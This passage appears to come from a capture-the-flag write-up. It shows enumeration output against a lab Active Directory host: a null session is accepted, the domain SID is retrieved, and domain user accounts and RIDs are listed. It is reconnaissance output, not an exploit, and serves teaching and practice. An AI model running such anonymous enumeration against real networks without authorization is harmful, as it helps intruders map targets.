+</span><span class=lnt>309
+</span><span class=lnt>310
+</span><span class=lnt>311
+</span><span class=lnt>312
+</span><span class=lnt>313
+</span><span class=lnt>314
+</span><span class=lnt>315
+</span><span class=lnt>316
+</span><span class=lnt>317
+</span><span class=lnt>318
+</span><span class=lnt>319
+</span><span class=lnt>320
+</span><span class=lnt>321
+</span><span class=lnt>322
+</span><span class=lnt>323
+</span><span class=lnt>324
+</span><span class=lnt>325
+</span><span class=lnt>326
+</span><span class=lnt>327
+</span><span class=lnt>328
+</span><span class=lnt>329
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl> <span class=o>=========================================</span><span class=p>(</span> <span class=n>Target</span> <span class=n>Information</span> <span class=p>)</span><span class=o>=========================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Target</span> <span class=o>...........</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span>
+</span></span><span class=line><span class=cl><span class=ne>RID</span> <span class=ne>Range</span> <span class=o>........</span> <span class=mi>500</span><span class=o>-</span><span class=mi>550</span><span class=p>,</span><span class=mi>1000</span><span class=o>-</span><span class=mi>1050</span>
+</span></span><span class=line><span class=cl><span class=n>Username</span> <span class=o>.........</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>Password</span> <span class=o>.........</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>Known</span> <span class=n>Usernames</span> <span class=o>..</span> <span class=n>administrator</span><span class=p>,</span> <span class=n>guest</span><span class=p>,</span> <span class=n>krbtgt</span><span class=p>,</span> <span class=n>domain</span> <span class=n>admins</span><span class=p>,</span> <span class=n>root</span><span class=p>,</span> <span class=n>bin</span><span class=p>,</span> <span class=n>none</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> <span class=o>===========================</span><span class=p>(</span> <span class=n>Enumerating</span> <span class=n>Workgroup</span><span class=o>/</span><span class=n>Domain</span> <span class=n>on</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span> <span class=p>)</span><span class=o>===========================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>E</span><span class=p>]</span> <span class=n>Can</span><span class=s1>&#39;t find workgroup/domain</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> <span class=o>===============================</span><span class=p>(</span> <span class=n>Nbtstat</span> <span class=n>Information</span> <span class=k>for</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span> <span class=p>)</span><span class=o>===============================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Looking</span> <span class=n>up</span> <span class=n>status</span> <span class=n>of</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span>
+</span></span><span class=line><span class=cl><span class=n>No</span> <span class=n>reply</span> <span class=n>from</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> <span class=o>===================================</span><span class=p>(</span> <span class=n>Session</span> <span class=n>Check</span> <span class=n>on</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span> <span class=p>)</span><span class=o>===================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Server</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span> <span class=n>allows</span> <span class=n>sessions</span> <span class=n>using</span> <span class=n>username</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>password</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> <span class=o>================================</span><span class=p>(</span> <span class=n>Getting</span> <span class=n>domain</span> <span class=n>SID</span> <span class=k>for</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span> <span class=p>)</span><span class=o>================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Domain</span> <span class=n>Name</span><span class=p>:</span> <span class=n>HTB</span>                                
+</span></span><span class=line><span class=cl><span class=n>Domain</span> <span class=n>Sid</span><span class=p>:</span> <span class=n>S</span><span class=o>-</span><span class=mi>1</span><span class=o>-</span><span class=mi>5</span><span class=o>-</span><span class=mi>21</span><span class=o>-</span><span class=mi>3072663084</span><span class=o>-</span><span class=mi>364016917</span><span class=o>-</span><span class=mi>1341370565</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Host</span> <span class=n>is</span> <span class=n>part</span> <span class=n>of</span> <span class=n>a</span> <span class=n>domain</span> <span class=p>(</span><span class=ow>not</span> <span class=n>a</span> <span class=n>workgroup</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> <span class=o>==================================</span><span class=p>(</span> <span class=ne>OS</span> <span class=n>information</span> <span class=n>on</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span> <span class=p>)</span><span class=o>==================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>E</span><span class=p>]</span> <span class=n>Can</span><span class=s1>&#39;t get OS info with smbclient</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Got</span> <span class=ne>OS</span> <span class=n>info</span> <span class=k>for</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span> <span class=n>from</span> <span class=n>srvinfo</span><span class=p>:</span>  
+</span></span><span class=line><span class=cl><span class=n>do_cmd</span><span class=p>:</span> <span class=n>Could</span> <span class=ow>not</span> <span class=n>initialise</span> <span class=n>srvsvc</span><span class=o>.</span> <span class=n>Error</span> <span class=n>was</span> <span class=n>NT_STATUS_ACCESS_DENIED</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> <span class=o>=======================================</span><span class=p>(</span> <span class=n>Users</span> <span class=n>on</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>191.98</span> <span class=p>)</span><span class=o>=======================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x2137</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x463</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00020015</span> <span class=n>Account</span><span class=p>:</span> <span class=o>$</span><span class=mi>331000</span><span class=o>-</span><span class=n>VK4ADACQNUCA</span>  <span class=n>Name</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>    <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0xfbc</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x1f4</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000010</span> <span class=n>Account</span><span class=p>:</span> <span class=n>Administrator</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>Administrator</span>     <span class=n>Desc</span><span class=p>:</span> <span class=n>Built</span><span class=o>-</span><span class=ow>in</span> <span class=n>account</span> <span class=k>for</span> <span class=n>administering</span> <span class=n>the</span> <span class=n>computer</span><span class=o>/</span><span class=n>domain</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x2369</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x47e</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>andy</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>Andy</span> <span class=n>Hislip</span>       <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0xfbe</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x1f7</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000215</span> <span class=n>Account</span><span class=p>:</span> <span class=n>DefaultAccount</span> <span class=n>Name</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>    <span class=n>Desc</span><span class=p>:</span> <span class=n>A</span> <span class=n>user</span> <span class=n>account</span> <span class=n>managed</span> <span class=n>by</span> <span class=n>the</span> <span class=n>system</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0xfbd</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x1f5</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000215</span> <span class=n>Account</span><span class=p>:</span> <span class=n>Guest</span>  <span class=n>Name</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>    <span class=n>Desc</span><span class=p>:</span> <span class=n>Built</span><span class=o>-</span><span class=ow>in</span> <span class=n>account</span> <span class=k>for</span> <span class=n>guest</span> <span class=n>access</span> <span class=n>to</span> <span class=n>the</span> <span class=n>computer</span><span class=o>/</span><span class=n>domain</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x2352</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x478</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>HealthMailbox0659cc1</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>HealthMailbox</span><span class=o>-</span><span class=n>EXCH01</span><span class=o>-</span><span class=mi>010</span>   <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x234b</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x471</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>HealthMailbox670628e</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>HealthMailbox</span><span class=o>-</span><span class=n>EXCH01</span><span class=o>-</span><span class=mi>003</span>   <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x234d</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x473</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>HealthMailbox6ded678</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>HealthMailbox</span><span class=o>-</span><span class=n>EXCH01</span><span class=o>-</span><span class=mi>005</span>   <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x2351</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x477</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>HealthMailbox7108a4e</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>HealthMailbox</span><span class=o>-</span><span class=n>EXCH01</span><span class=o>-</span><span class=mi>009</span>   <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x234c</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x472</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>HealthMailbox968e74d</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>HealthMailbox</span><span class=o>-</span><span class=n>EXCH01</span><span class=o>-</span><span class=mi>004</span>   <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>                                                            <span class=mi>19</span><span class=p>:</span><span class=mi>11</span><span class=p>:</span><span class=mi>30</span> <span class=p>[</span><span class=mi>229</span><span class=o>/</span><span class=mi>531</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x2350</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x476</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>HealthMailboxb01ac64</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>HealthMailbox</span><span class=o>-</span><span class=n>EXCH01</span><span class=o>-</span><span class=mi>008</span>   <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x234a</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x470</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>HealthMailboxc0a90c9</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>HealthMailbox</span><span class=o>-</span><span class=n>EXCH01</span><span class=o>-</span><span class=mi>002</span>   <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x2348</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x46e</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>HealthMailboxc3d7722</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>HealthMailbox</span><span class=o>-</span><span class=n>EXCH01</span><span class=o>-</span><span class=n>Mailbox</span><span class=o>-</span><span class=n>Database</span><span class=o>-</span><span class=mi>1118319013</span>   <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x2349</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x46f</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>HealthMailboxfc9daad</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>HealthMailbox</span><span class=o>-</span><span class=n>EXCH01</span><span class=o>-</span><span class=mi>001</span>   <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x234f</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x475</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>HealthMailboxfd87238</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>HealthMailbox</span><span class=o>-</span><span class=n>EXCH01</span><span class=o>-</span><span class=mi>007</span>   <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0xff4</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x1f6</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000011</span> <span class=n>Account</span><span class=p>:</span> <span class=n>krbtgt</span> <span class=n>Name</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>    <span class=n>Desc</span><span class=p>:</span> <span class=n>Key</span> <span class=n>Distribution</span> <span class=n>Center</span> <span class=n>Service</span> <span class=n>Account</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x2360</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x47a</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>lucinda</span>       <span class=n>Name</span><span class=p>:</span> <span class=n>Lucinda</span> <span class=n>Berger</span>    <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x236a</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x47f</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>mark</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>Mark</span> <span class=n>Brandt</span>       <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x236b</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x480</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>santi</span> <span class=n>Name</span><span class=p>:</span> <span class=n>Santi</span> <span class=n>Rodriguez</span>   <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x235c</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x479</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00000210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>sebastien</span>     <span class=n>Name</span><span class=p>:</span> <span class=n>Sebastien</span> <span class=n>Caron</span>   <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x215a</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x468</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00020011</span> <span class=n>Account</span><span class=p>:</span> <span class=n>SM_1b41c9286325456bb</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>Microsoft</span> <span class=n>Exchange</span> <span class=n>Migration</span>       <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x2161</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x46c</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00020011</span> <span class=n>Account</span><span class=p>:</span> <span class=n>SM_1ffab36a2f5f479cb</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>SystemMailbox</span><span class=p>{</span><span class=mi>8</span><span class=n>cc370d3</span><span class=o>-</span><span class=mi>822</span><span class=n>a</span><span class=o>-</span><span class=mi>4</span><span class=n>ab8</span><span class=o>-</span><span class=n>a926</span><span class=o>-</span><span class=n>bb94bd0641a9</span><span class=p>}</span>        <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x2156</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x464</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00020011</span> <span class=n>Account</span><span class=p>:</span> <span class=n>SM_2c8eef0a09b545acb</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>Microsoft</span> <span class=n>Exchange</span> <span class=n>Approval</span> <span class=n>Assistant</span>      <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x2159</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x467</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00020011</span> <span class=n>Account</span><span class=p>:</span> <span class=n>SM_681f53d4942840e18</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>Discovery</span> <span class=n>Search</span> <span class=n>Mailbox</span>   <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x2158</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x466</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00020011</span> <span class=n>Account</span><span class=p>:</span> <span class=n>SM_75a538d3025e4db9a</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>Microsoft</span> <span class=n>ExchangeDesc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x215c</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x46a</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00020011</span> <span class=n>Account</span><span class=p>:</span> <span class=n>SM_7c96b981967141ebb</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>E4E</span> <span class=n>Encryption</span> <span class=n>Store</span> <span class=o>-</span> <span class=n>Active</span>      <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x215b</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x469</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00020011</span> <span class=n>Account</span><span class=p>:</span> <span class=n>SM_9b69f1b9d2cc45549</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>Microsoft</span> <span class=n>Exchange</span> <span class=n>Federation</span> <span class=n>Mailbox</span>      <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x215d</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x46b</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00020011</span> <span class=n>Account</span><span class=p>:</span> <span class=n>SM_c75ee099d0a64c91b</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>Microsoft</span> <span class=n>ExchangeDesc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x2157</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x465</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00020011</span> <span class=n>Account</span><span class=p>:</span> <span class=n>SM_ca8c2ed5bdab4dc9b</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>Microsoft</span> <span class=n>ExchangeDesc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>index</span><span class=p>:</span> <span class=mh>0x2365</span> <span class=ne>RID</span><span class=p>:</span> <span class=mh>0x47b</span> <span class=n>acb</span><span class=p>:</span> <span class=mh>0x00010210</span> <span class=n>Account</span><span class=p>:</span> <span class=n>svc</span><span class=o>-</span><span class=n>alfresco</span>  <span class=n>Name</span><span class=p>:</span> <span class=n>svc</span><span class=o>-</span><span class=n>alfresco</span>      <span class=n>Desc</span><span class=p>:</span> <span class=p>(</span><span class=n>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>Administrator</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x1f4</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>Guest</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x1f5</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>krbtgt</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x1f6</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>DefaultAccount</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x1f7</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=o>$</span><span class=mi>331000</span><span class=o>-</span><span class=n>VK4ADACQNUCA</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x463</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>SM_2c8eef0a09b545acb</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x464</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>SM_ca8c2ed5bdab4dc9b</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x465</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>SM_75a538d3025e4db9a</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x466</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>SM_681f53d4942840e18</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x467</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>SM_1b41c9286325456bb</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x468</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>SM_9b69f1b9d2cc45549</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x469</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>SM_7c96b981967141ebb</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x46a</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>SM_c75ee099d0a64c91b</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x46b</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>SM_1ffab36a2f5f479cb</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x46c</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>HealthMailboxc3d7722</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x46e</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>HealthMailboxfc9daad</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x46f</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>HealthMailboxc0a90c9</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x470</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>HealthMailbox670628e</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x471</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>HealthMailbox968e74d</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x472</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>HealthMailbox6ded678</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x473</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>HealthMailbox83d6781</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x474</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>HealthMailboxfd87238</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x475</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>HealthMailboxb01ac64</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x476</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>HealthMailbox7108a4e</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x477</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>HealthMailbox0659cc1</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x478</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>sebastien</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x479</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>:[</span><span class=n>lucinda</span><span class=p>]</span> <span class=n>rid</span><span class=p>:[</span><span class=mh>0x47a</span><span class=p>]</span>
